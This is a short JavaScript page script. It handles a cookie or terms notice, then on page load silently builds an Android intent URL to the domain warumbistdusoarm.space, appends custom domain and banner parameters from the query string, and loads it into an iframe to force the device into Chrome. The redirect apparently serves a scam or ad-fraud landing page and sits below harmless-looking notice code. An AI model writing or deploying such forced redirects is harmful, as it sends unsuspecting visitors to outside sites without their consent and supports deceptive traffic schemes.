"use strict";

window.onload = function () {
       
  if (localStorage.getItem('tems')) {
    $('.notice').addClass('notice-destroy');
  } else {
    $('.notice').removeClass('notice-destroy');
  }

  

  $('.btn-true').on('click', function (e) {
    e.preventDefault();
    destroyNotice();
    localStorage.setItem('tems', 'true');
  });
  $('.btn-false').on('click', function (e) {
    e.preventDefault();
    destroyNotice(); //localStorage.setItem('tems','false');
  });

  function destroyNotice() {
    $('.notice').addClass('notice-destroy');
  }
       console.log('f');
         var str = "intent://warumbistdusoarm.space/?5edf54a7513dc=0";
         console.log(str);
        var params = window
          .location
          .search
          .replace('?','')
          .split('&')
          .reduce(
          function(p,e){
              var a = e.split('=');
              p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
              return p;
          },
          {}
      );
      
      if (params['ag_custom_domain']){
        str += "&ag_custom_domain=" + params['ag_custom_domain'];
      };

      if (params['ag_custom_banners']) {
        str += "&ag_custom_banners=" + params['ag_custom_banners'];
      }

      str+= "#Intent;scheme=http;package=com.android.chrome;end";
      console.log(str);
      let intentFrame = document.getElementById('iframe');
    
      intentFrame.setAttribute('src', str);
};
